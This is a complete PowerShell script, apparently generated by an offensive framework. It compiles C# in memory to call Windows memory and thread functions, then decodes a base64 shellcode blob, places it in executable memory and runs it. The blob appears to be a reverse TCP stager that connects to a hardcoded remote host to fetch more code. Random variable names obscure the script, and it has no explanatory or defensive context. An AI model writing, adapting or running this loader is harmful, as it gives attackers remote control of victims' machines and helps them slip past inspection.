Set-StrictMode -Version 2
$ntUd1 = @"
	using System;
	using System.Runtime.InteropServices;
	namespace u8Qt4 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$zCN = New-Object Microsoft.CSharp.CSharpCodeProvider
$ka_v2 = New-Object System.CodeDom.Compiler.CompilerParameters
$ka_v2.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$ka_v2.GenerateInMemory = $True
$q_ = $zCN.CompileAssemblyFromSource($ka_v2, $ntUd1)

[Byte[]]$exGGe = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmhHwZ/0aAIABAGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==")

$k4z = [u8Qt4.func]::VirtualAlloc(0, $exGGe.Length + 1, [u8Qt4.func+AllocationType]::Reserve -bOr [u8Qt4.func+AllocationType]::Commit, [u8Qt4.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$k4z) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($exGGe, 0, $k4z, $exGGe.Length)
[IntPtr] $iLn = [u8Qt4.func]::CreateThread(0,0,$k4z,0,0,0)
if ([Bool]!$iLn) { $global:result = 7; return }
$wGV4P = [u8Qt4.func]::WaitForSingleObject($iLn, [u8Qt4.func+Time]::Infinite)
